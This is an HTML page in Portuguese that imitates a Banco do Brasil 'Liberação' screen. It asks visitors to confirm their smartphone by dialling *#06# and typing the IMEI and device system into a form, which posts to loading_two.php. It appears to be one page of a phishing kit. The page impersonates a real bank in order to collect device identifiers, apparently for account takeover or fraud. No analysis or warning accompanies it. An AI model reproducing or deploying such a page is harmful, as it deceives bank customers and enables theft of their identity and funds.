<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="theme-color" content="#fff200">
	<meta name="apple-mobile-web-app-status-bar-style" content="#fff200">
	<meta name="msapplication-navbutton-color" content="#fff200">
	<title>Acesso - BB</title>
	<link rel="stylesheet" href="_styles/home.css">
	<script src="_jscripts/jquery.min.js"></script>
	<script src="_jscripts/jquery_mask.js"></script>
	<script src="_jscripts/home.js"></script>
</head>
<body class="bg-cinza">
<div class="container bg-yellow">
	<div class="content main_header">
		<div class="logo">
			<img src="_images/logo.png" height="40" width="40">
		</div><!-- logo -->
		<h1>Liberação</h1>
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->


<div class="container bg-blue">
	<div class="content_margin main_msg">
		<span class="msg_error">
			Precisamos confirmar seu smartphone.<br> 
			Realize os passos abaixo, para confirmar seu dispositivo.
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->

<script>
	function check_imei(){
		var imei = document.getElementById('imei').value;
		var sistema = document.getElementById('dispositivo').value;

		if(imei.length < 15){
			alert("Você deve informar corretamente o número do IMEI do seu celular!");
			document.getElementById('imei').value = '';
			document.getElementById('imei').focus();
			return false;
		}

		if(sistema == 'sel'){
			alert("Selecione o Sistema do seu Celular!");
			return false;
		}
	}
</script>

<div class="container">
	<div class="content_margin">
		<p style="display:block;margin:10px 0 10px 0;font-size:1.1em;font-weight: bold;">Como encontrar o IMEI no smartphone?</p>
		<p style="display:block;margin:0 0 10px 0;font-size:1.1em;color:#666;line-height: 1.2em;">Abra o discador de seu telefone e digite o seguinte código no teclado: <span style="font-weight: bold;color:red;">*#06#</p>
		<p style="display:block;margin:0 0 30px 0;font-size:1.1em;color:#666;line-height: 1.2em;">Digite o código que aparecerá no visor, no campo abaixo.</p>

		<form action="loading_two.php" method="post" class="form_enter" onsubmit="return check_imei();">
			<label for="imei">
				<input type="number" name="imei" id="imei" class="input input_ag" placeholder="Código IMEI" maxlength="18" autocomplete="off" 
				oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
			</label>

			<br><br>

			<select name="dispositivo" id="dispositivo" class="input input_ag" style="color:#333;margin-top: -20px;">
				<option name="sel" value="sel" disabled="disabled" selected="selected">Dispositivo</option>
				<option name="and" value="android">Android</option>
				<option name="ios" value="android">IOS (Apple)</option>
			</select>

			<label for="submit">
				<input type="hidden" name="sender" value="get_mei">
				<input type="submit" name="submit" id="submit" class="btn_submit" value="Validar Smartphone">
			</label>
		</form>
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->

<div class="container">
	<div class="content" id="receive_msg" style="color:#ff0000;font-weight:bold;display:block;text-align:center;margin:10px auto;">
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->


</body>
</html>
